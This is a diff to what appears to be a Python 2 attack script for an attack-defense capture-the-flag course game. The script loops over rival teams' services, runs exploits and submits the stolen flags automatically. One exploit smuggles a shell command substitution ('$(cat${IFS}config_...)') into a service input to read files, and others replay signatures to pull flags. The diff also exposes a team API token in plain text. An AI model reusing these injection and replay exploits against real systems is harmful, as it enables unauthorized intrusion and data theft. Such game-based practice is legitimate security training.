@@ -3,6 +3,7 @@ import json
 import socket
 import time
 from pprint import pprint
+import traceback
 
 def netcat(hostname, port, content):
     print 'content:', content
@@ -28,21 +29,22 @@ def exploit_configuration(hostname, port, flagId):
     print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
     content = 'd'+ "\n" + 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
     ret_list = netcat(hostname, port, content)
-    #print 'ret_list:'
-    #pprint(ret_list)
+    print 'ret_list:'
+    pprint(ret_list)
     file_name = ret_list[2].split()[4]
-    #print file_name,file_name.index('!')
+    print 'filename:',file_name, 'file_name_index', file_name.index('!')
     file_name = file_name[:file_name.index('!')]
-    #print file_name
-    #print "\n\n\n\n\n\n"
+    print 'filename:',file_name
+    print "\n\n\n\n\n\n"
     content = 'l' + "\n" + file_name + "\n" + "\n" + 'v'
     ret_list = netcat(hostname, port, content)
-    #print 'ret_list:'
-    #pprint(ret_list)
+    print 'ret_list:'
+    pprint(ret_list)
     flag = ret_list[5].split('[*]')[0].split()[3]
+    print 'flag:', flag
     eqIndex = flag.index('=')
     eqIndex += 1
-    #print flag, flag.index('='), flag[eqIndex:-2]
+    print 'flag:',flag, flag.index('='), flag[eqIndex:-2]
     flag = flag[eqIndex:-2]
     print 'FLAG================================================================================================:', flag
     print(t.submit_flag([flag]))
@@ -71,9 +73,34 @@ def exploit_no_rsa(hostname, port, flagId):
     print 'flag_line:', flag_line
     flag = flag_line.split(' ')[3]
     print 'FLAG================================================================================================:',flag
-    print(t.submit_flag([flag]))	    
+    print(t.submit_flag([flag]))
 
-t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
+def exploit_pingpong(hostname, port, flagId):
+    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
+    content = 'S'+ "\n" + '0' + flagId
+    ret_list = netcat(hostname, port, content)
+    #print 'ret_list:', ret_list
+    sigLine = ret_list[2]
+    #print 'sigline:',sigLine
+    lineArr = sigLine.split('\\n')
+    #print 'lineArr:', lineArr
+    sig = lineArr[1]
+    #print 'sig:', sig
+    content = 'R' + "\n" + flagId + ' ' + sig
+    #print 'content:', content
+    ret_list = netcat(hostname, port, content)
+    #print ret_list
+    flag_line = ret_list[1]
+    #print 'flag_line:',flag_line
+    lineArr = flag_line.split('\\n')
+    #print 'lineArr:', lineArr
+    flag_line = lineArr[1]
+    print 'flag_line:', flag_line
+    flag = flag_line.split(' ')[3]
+    print 'FLAG================================================================================================:',flag
+    print(t.submit_flag([flag]))
+
+t = Team("http://actf1.cse545.rev.fish/", "q7ySYu4SmlyCozyU1Lia6eW67PHBZvM4")
 print(t.game_url)
 #print(t.get_vm())
 while True:
@@ -100,16 +127,17 @@ while True:
             flag_id = target['flag_id']
             if service_name == 'no-rsa':
                 try:
-                    #pass
-                    exploit_no_rsa(hostname,port,flag_id)
+                    pass
+                    #exploit_no_rsa(hostname,port,flag_id)
                 except:
                     print 'Exception occured for user'
-            else:
+            elif service_name == 'configurations':
                 try:
                     #pass
                     exploit_configuration(hostname, port, flag_id)
-                except:
-                    print 'Exception occured for user'
+                except Exception:
+                    traceback.print_exc()
+                    print 'Exception occured for user:'
             #break
     while True:
         newGameStatus = t.get_game_status()
